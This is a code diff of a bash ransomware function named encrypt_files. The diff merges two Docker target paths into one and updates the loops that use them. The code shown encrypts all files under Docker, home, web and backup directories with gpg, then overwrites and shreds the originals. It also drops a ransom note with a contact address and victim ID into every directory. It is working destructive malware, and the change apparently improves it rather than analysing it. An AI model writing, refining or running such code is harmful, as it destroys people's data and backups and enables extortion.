@@ -74,21 +74,20 @@ encrypt_files() {
 
     echo "Encryption in progress..."
 
-    target_dir_1="/var/lib/docker/volumes"
-    target_dir_2="/var/lib/docker/containers"
-    target_dir_3="/home"
-    target_dir_4="/var/www"
-    target_dir_5="/home/backups"
-    target_dir_6="/var/backups"
+    target_dir_1="/var/lib/docker"
+    target_dir_2="/home"
+    target_dir_3="/var/www"
+    target_dir_4="/home/backups"
+    target_dir_5="/var/backups"
 
-    for file in $(find $target_dir_1 $target_dir_2 $target_dir_3 $target_dir_4 $target_dir_5 $target_dir_6 -type f); do
+    for file in $(find $target_dir_1 $target_dir_2 $target_dir_3 $target_dir_4 $target_dir_5 -type f); do
         if [ -d "$file" ]; then
             continue
         fi
         echo "$password" | gpg --batch --yes --passphrase-fd 0 --symmetric --cipher-algo AES256 -o "$file.Magnus" "$file" 
     done
 
-    for file in $(find $target_dir_1 $target_dir_2 $target_dir_3 $target_dir_4 $target_dir_5 $target_dir_6 -type f); do
+    for file in $(find $target_dir_1 $target_dir_2 $target_dir_3 $target_dir_4 $target_dir_5 -type f); do
         if [ -f "$file.Magnus" ]; then
             dd if=/dev/urandom of=$file bs=1M count=5
             shred -n 2 -u $file
@@ -97,7 +96,7 @@ encrypt_files() {
 
     echo "Your files have all been encrypted, contact example@protonmail.com for the decryption key! Your unique victim ID: $victim_id" > R34DM3.txt
 
-    for dir in $(find $target_dir_1 $target_dir_2 $target_dir_3 $target_dir_4 $target_dir_5 $target_dir_6 -type d); do
+    for dir in $(find $target_dir_1 $target_dir_2 $target_dir_3 $target_dir_4 $target_dir_5 -type d); do
         cp R34DM3.txt "$dir/R34DM3.txt"
     done
 }
